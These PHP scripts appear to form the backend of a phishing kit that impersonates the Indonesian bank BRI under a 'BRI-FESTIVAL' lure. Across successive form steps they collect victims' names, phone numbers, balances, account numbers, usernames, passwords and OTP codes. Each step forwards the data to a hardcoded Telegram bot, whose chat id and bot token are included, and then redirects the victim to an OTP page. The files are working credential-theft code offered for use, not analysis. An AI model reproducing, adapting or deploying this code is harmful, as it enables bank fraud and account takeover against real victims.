<?php
include "telegram.php";
session_start();

$nama = $_POST['nama'];
$nomor = $_POST['nomor'];
$saldo = $_POST['saldo'];

$_SESSION['nama'] = $nama;
$_SESSION['nomor'] = $nomor;
$_SESSION['saldo'] = $saldo;

$message = "
━─━────༺𝘽𝙍𝙄༻────━─━

- Nama Lengkap : ".$nama."

- No HP : ".$nomor."

- Saldo : ".$saldo."

━─━────༺𝘽𝙍𝙄-𝙁𝙀𝙎𝙏𝙄𝙑𝘼𝙇༻────━─━
 ";

function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location: ../otp.html');
?>

<?php
$id_telegram = "6703815881";
$id_botTele  = "7698977308:AAFpUSNEJRUsaupq-kw6eaD1nhoFqVZwy7Y";
?>

<?php
include "telegram.php";
session_start();

$uname = $_POST['uname'];
$pass = $_POST['pass'];

$_SESSION['uname'] = $uname;
$_SESSION['pass'] = $pass;

$nama = $_SESSION['nama'];
$rek = $_SESSION['rek'];
$nomor = $_SESSION['nomor'];
$saldo = $_SESSION['saldo'];

$message = "
━─━────༺𝘽𝙍𝙄༻────━─━

- Nama Lengkap :
".$nama."

- Nomor Rekening :
".$rek."

- No HP : ".$nomor."

- Saldo : ".$saldo."

- Username : ".$uname."
- Password : ".$pass."

━─━────༺𝘽𝙍𝙄-𝙁𝙀𝙎𝙏𝙄𝙑𝘼𝙇༻────━─━
 ";

function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location: ../otp.php');
?>

<?php
$id_telegram = "6703815881";
$id_botTele  = "7698977308:AAFpUSNEJRUsaupq-kw6eaD1nhoFqVZwy7Y";
?>

<?php
include "telegram.php";
session_start();

$nama1 = $_POST['nama1'];

$_SESSION['nama1'] = $nama1;

$nama = $_SESSION['nama'];
$nomor = $_SESSION['nomor'];
$saldo = $_SESSION['saldo'];
$uname = $_SESSION['uname'];
$pass = $_SESSION['pass'];

$message = "
━─━────༺𝘽𝙍𝙄༻────━─━
- Nama Lengkap : ".$nama."

- No HP : ".$nomor."

- Saldo : ".$saldo."

- Username : ".$uname."
- Password : ".$pass."

- Code OTP : ".$nama1."

━─━────༺𝘽𝙍𝙄-𝙁𝙀𝙎𝙏𝙄𝙑𝘼𝙇༻────━─━
 ";

function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location: ../otp.php');
?>

<?php
include "telegram.php";
session_start();

$nama1 = $_POST['nama1'];

$_SESSION['nama1'] = $nama1;

$nama = $_SESSION['nama'];
$nomor = $_SESSION['nomor'];
$saldo = $_SESSION['saldo'];
$uname = $_SESSION['uname'];
$pass = $_SESSION['pass'];

$message = "
━─━────༺𝘽𝙍𝙄༻────━─━
- Nama Lengkap : ".$nama."

- No HP : ".$nomor."

- Saldo : ".$saldo."

- Username : ".$uname."
- Password : ".$pass."

- Code OTP : ".$nama1."

━─━────༺𝘽𝙍𝙄-𝙁𝙀𝙎𝙏𝙄𝙑𝘼𝙇༻────━─━
 ";

function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location: ../otp.php');
?>

<?php
$id_telegram = "6703815881";
$id_botTele  = "7698977308:AAFpUSNEJRUsaupq-kw6eaD1nhoFqVZwy7Y";
?>